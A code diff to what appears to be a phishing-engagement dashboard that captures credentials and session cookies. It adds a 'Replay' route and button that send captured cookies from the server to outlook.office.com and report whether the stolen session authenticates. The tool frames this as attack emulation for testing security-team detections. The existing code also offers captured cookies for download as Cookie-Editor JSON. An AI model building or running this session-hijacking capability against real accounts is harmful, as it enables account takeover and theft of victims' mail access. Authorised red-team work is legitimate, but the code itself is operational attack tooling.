@@ -45,6 +45,7 @@ func NewRouter(api *handlers.APIHandler, authH *auth.Handler) http.Handler {
 
 	// Stage 6 - finishing touches
 	apiRouter.HandleFunc("/captures/{session_id}/cookies", api.HandleDownloadCookies).Methods("GET")
+	apiRouter.HandleFunc("/captures/{session_id}/replay", api.HandleReplaySession).Methods("POST")
 	apiRouter.HandleFunc("/test-email", api.HandleSendTestEmail).Methods("POST")
 	apiRouter.HandleFunc("/engagement/report", api.HandleEngagementReport).Methods("GET")
 	apiRouter.HandleFunc("/dns/health", api.HandleDNSHealth).Methods("GET")
@@ -562,6 +563,7 @@ function renderCreds(creds){
        +'<td><span class="mip">'+esc(c.remote_addr)+'</span></td>'
        +'<td style="white-space:nowrap"><button class="expandbtn" type="button" aria-expanded="false" aria-controls="rec-'+c.id+'" onclick="toggleRec('+c.id+')">Why?</button>'
        +(cookieCount?' <a class="expandbtn" href="/api/captures/'+esc(c.session_id)+'/cookies" download title="Cookie-Editor JSON">&#x2B07; Cookies</a>':'')
+       +(c.exploitable?' <button class="expandbtn" type="button" onclick="replaySession(\''+esc(c.session_id)+'\')" title="Replay session against Microsoft to validate CSOC detections" style="border-color:rgba(255,23,68,.3);color:var(--red)">&#x26A1; Replay</button>':'')
        +'</td>'
        +'</tr>'
        +'<tr class="detailrow hide" id="rec-'+c.id+'"><td colspan="8">'+recsHtml+'</td></tr>';
@@ -718,6 +720,35 @@ function submitGroup(){
     .catch(function(e){alert('Create failed: '+e.message);});
 }
 function downloadReport(){window.location='/api/engagement/report';}
+function replaySession(sid){
+  var msg = 'Attack-emulation: replay captured cookies from THIS dashboard host against outlook.office.com to test CSOC detection on the target tenant.\n\n'
+          + 'Session: '+sid+'\n\n'
+          + 'This sends authenticated traffic from this server\'s public IP. Pre-warn your CSOC team and share the source IP so they can correlate the alert.\n\n'
+          + 'Continue?';
+  if(!confirm(msg))return;
+  var btn=document.querySelector('button[onclick*="replaySession(\''+sid+'\')"]');
+  if(btn){btn.disabled=true;btn.textContent='⚡ Running…';}
+  fetch('/api/captures/'+encodeURIComponent(sid)+'/replay',{method:'POST'})
+    .then(function(r){return r.json();})
+    .then(function(d){
+      var summary=(d.success?'✅ SUCCESS - cookies authenticated':'❌ FAILED - cookies bounced to login or errored')+'\n\n'
+              +'Username:    '+(d.username||'(none)')+'\n'
+              +'Target:      '+d.target+'\n'
+              +'Final URL:   '+d.final_url+'\n'
+              +'Final host:  '+d.final_host+'\n'
+              +'HTTP status: '+d.status_code+'\n'
+              +'Auth\'d:      '+d.authenticated+'\n'
+              +'Duration:    '+d.duration_ms+'ms\n'
+              +'Started at:  '+d.started_at+'\n'
+              +'Source:      '+(d.source_ip||'(this host)')+'\n\n'
+              +'Redirect chain ('+(d.redirect_chain||[]).length+' hops):\n'+(d.redirect_chain||[]).join('\n')
+              +(d.error?'\n\nError: '+d.error:'')
+              +'\n\nShare the timestamp + source IP with your CSOC; they should now check their SIEM for sign-in / Conditional Access / token-replay alerts.';
+      alert(summary);
+    })
+    .catch(function(e){alert('Replay request failed: '+e.message);})
+    .finally(function(){if(btn){btn.disabled=false;btn.textContent='⚡ Replay';}});
+}
 function sendTestFromForm(){
   var smtp=document.getElementById('camp-smtp').value;
   if(!smtp){alert('Pick a sending profile under Advanced first.');return;}
